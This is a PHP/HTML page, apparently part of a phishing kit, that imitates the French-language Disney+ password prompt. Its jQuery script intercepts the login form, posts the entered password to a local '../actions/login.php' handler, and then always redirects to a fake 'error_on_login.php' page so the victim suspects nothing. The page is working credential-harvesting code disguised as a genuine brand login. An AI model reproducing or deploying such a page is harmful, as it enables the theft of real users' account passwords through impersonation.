<?php 

include("../common/sub_includes.php");

?>

<html lang="FR" xmlns="http://www.w3.org/1999/xhtml"  style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="" id="formit" name="dssLogin" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Entrez votre mot de passe</h3>

                                
                                
                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Mot de passe" display="inline" id="pass" name="password_input" placeholder="Mot de passe" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="password" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                    <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">(sensible à la casse)</div>
                                </fieldset>

                                <div>
                                    
                                    <button aria-label="Accepter et continuer" id="colorbg"  data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" type="submit">
                                    <span id="btnn">S'IDENTIFIER</span> 
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svgg" style="margin:auto;background:transparent;display:none;" width="230px" height="90%" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#2ecbff" stroke-width="6" r="34" stroke-dasharray="160.22122533307947 55.40707511102649">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="0.7092198581560283s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>
                                    </button>
                            
                            </div>
                            <div class="flex" style="padding-top : 25px">
                            <a class="link link--secondary link--secondary__hul body-copy margin--top-6" style="color: #66bcff;;margin-top : 1.5rem !important;font-size : 15px;padding-top : 15px"  aria-label="Mot de passe oublié&nbsp;?" data-testid="login-password-forgot-password" data-gv2elementkey="forgotPassword" data-gv2interactionkey="forgotPassword" style="display: block;" data-gv2-interaction-bound="true">Mot de passe oublié&nbsp;?</a>

                            </div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


<script>

    $("#pass").on("input propertychange",function(){
        if($(this).val().length >= 1){
            $(this).css("border","none")
            $("#error_it").css("display","none")
        }
    })




            $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
                        $("#svgg").css("display","flex")
                    $("#btnn").css("display","none")
        				$.ajax({
        						method: "POST",
                                url: "../actions/login.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "error_on_login.php";
                                }, 1500);
        					});
        				
        
        			});
        		});
</script>